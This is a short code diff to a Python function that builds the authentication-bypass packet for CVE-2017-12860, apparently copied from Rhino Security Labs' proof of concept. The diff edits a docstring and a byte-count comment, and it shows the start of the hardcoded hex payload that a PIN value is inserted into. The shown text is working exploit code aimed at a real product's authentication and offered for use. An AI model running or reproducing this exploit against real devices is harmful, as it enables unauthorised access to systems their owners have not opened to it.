@@ -10,11 +10,12 @@ def get_hex_ip_reversed(ip: str) -> str:
 def get_auth_payload(pin: str = "2270") -> bytes:
     """
     Constructs the exact EEMP packet used by the Rhino Security Labs CVE-2017-12860 exploit.
+    Uses the exact hardcoded string from their PoC, as modifying it may break the bypass.
     """
     import binascii
     pin_hex = binascii.hexlify(pin.encode('ascii')).decode()
     
-    # 96-byte magic packet string from Rhino Security Labs PoC
+    # 94-byte magic packet string from Rhino Security Labs PoC
     packet_hex = (
         "45454d5030313030455bc678040000004a00000001000000001c00000000000000"
         "ffffff00455bc6640201030005200320200001ff00ff00ff00000810000000010c"
